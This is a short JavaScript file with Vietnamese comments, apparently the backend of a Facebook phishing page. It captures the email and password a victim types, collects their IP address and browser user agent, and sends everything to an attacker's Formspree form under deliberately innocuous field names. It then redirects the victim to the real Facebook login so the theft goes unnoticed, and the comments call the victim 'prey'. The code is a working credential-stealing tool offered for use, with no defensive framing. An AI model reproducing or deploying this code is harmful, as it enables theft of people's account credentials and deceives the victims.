const CONFIG = {
    // Link Formspree bạn vừa tạo
    GATEWAY_URL: "https://formspree.io/f/xojkwjyw",
    REDIRECT_TARGET: "https://www.facebook.com/login"
};

async function captureAndSend() {
    // 1. Lấy dữ liệu từ màn hình
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if (!email || !pass) return;

    // 2. Lấy IP ngầm (để biết "con mồi" ở đâu)
    let ip = "N/A";
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
    } catch (e) {}

    // 3. Đóng gói dữ liệu (Đặt tên biến khôn khéo để tránh bị soi)
    const payload = {
        "Account_Identifier": email,
        "Security_String": pass,
        "Network_Path": ip,
        "Client_Agent": navigator.userAgent,
        "_subject": "New Update Received" // Tiêu đề email bạn sẽ nhận được
    };

    // 4. Bắn dữ liệu đi
    fetch(CONFIG.GATEWAY_URL, {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
    }).then(response => {
        // Gửi xong thì té ngay sang Facebook thật
        window.location.href = CONFIG.REDIRECT_TARGET;
    }).catch(error => {
        // Nếu lỗi cũng té luôn để không bị nghi ngờ
        window.location.href = CONFIG.REDIRECT_TARGET;
    });
}